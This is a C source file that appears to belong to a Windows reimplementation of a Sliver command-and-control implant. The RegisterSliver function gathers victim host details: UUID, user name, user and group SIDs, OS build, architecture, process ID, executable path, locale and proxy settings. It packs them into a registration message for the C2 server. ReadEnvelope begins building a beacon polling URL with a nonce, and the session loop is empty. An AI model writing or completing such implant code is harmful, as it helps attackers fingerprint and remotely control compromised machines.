#include "pch.h"

PBYTE RegisterSliver
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
	_In_ PDWORD pcbOutput
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	PBYTE pResult = NULL;
	DWORD cbResult = 1;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetVersionInfo(&OsVersion)) {
		LogError(L"ConvertSidToStringSidA failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	sprintf_s(lpVersion, 0x100, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}


	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, 0x20);
	lpLocaleName = ConvertWcharToChar(wszLocale);

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pSliverClient->szSliverName, lstrlenA(pSliverClient->szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[10] = CreateBytesElement(pSliverClient->lpHostName, lstrlenA(pSliverClient->lpHostName), 11);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pSliverClient->uReconnectInterval, 13);
	if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
	}

	ElementList[14] = CreateBytesElement(pSliverClient->szConfigID, lstrlenA(pSliverClient->szConfigID), 16);
	ElementList[15] = CreateVarIntElement(pSliverClient->uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	pResult = ALLOC(pFinalElement->cbMarshalledData);
	memcpy(pResult, pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
	if (pcbOutput != NULL) {
		*pcbOutput = pFinalElement->cbMarshalledData;
	}
CLEANUP:
	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpUUID != NULL) {
		FREE(lpUUID);
	}

	if (lpFullQualifiedName != NULL) {
		FREE(lpFullQualifiedName);
	}

	if (lpUserSid != NULL) {
		FREE(lpUserSid);
	}

	if (lpGroupSid != NULL) {
		FREE(lpGroupSid);
	}

	if (lpArch != NULL) {
		FREE(lpArch);
	}

	if (lpModulePath != NULL) {
		FREE(lpModulePath);
	}

	if (lpVersion != NULL) {
		FREE(lpVersion);
	}

	if (lpLocaleName != NULL) {
		FREE(lpLocaleName);
	}

	FreeElement(pFinalElement);

	return pResult;
}

VOID SessionMainLoop
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
)
{
	
}

PENVELOPE ReadEnvelope
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
)
{
	PENVELOPE pResult = NULL;
	LPSTR lpUrlPath = NULL;
	LPSTR lpNonce = NULL;
	PHTTP_RESP pResp = NULL;

	if (pSliverClient->IsClosed) {
		goto CLEANUP;
	}

	lpUrlPath = ParseSegmentsUrl(pSliverClient, PollType);
	lpNonce = GenNonceQuery(pSliverClient->uEncoderNonce);
	lpUrlPath = StrCatExA(lpUrlPath, "?z=");
	lpUrlPath[lstrlenA(lpUrlPath) - 2] = GenRandomDigit(FALSE);
	lpUrlPath = StrCatExA(lpUrlPath, lpNonce);
CLEANUP:
	if (lpUrlPath != NULL) {
		FREE(lpUrlPath);
	}

	if (lpNonce != NULL) {
		FREE(lpNonce);
	}

	return pResult;
}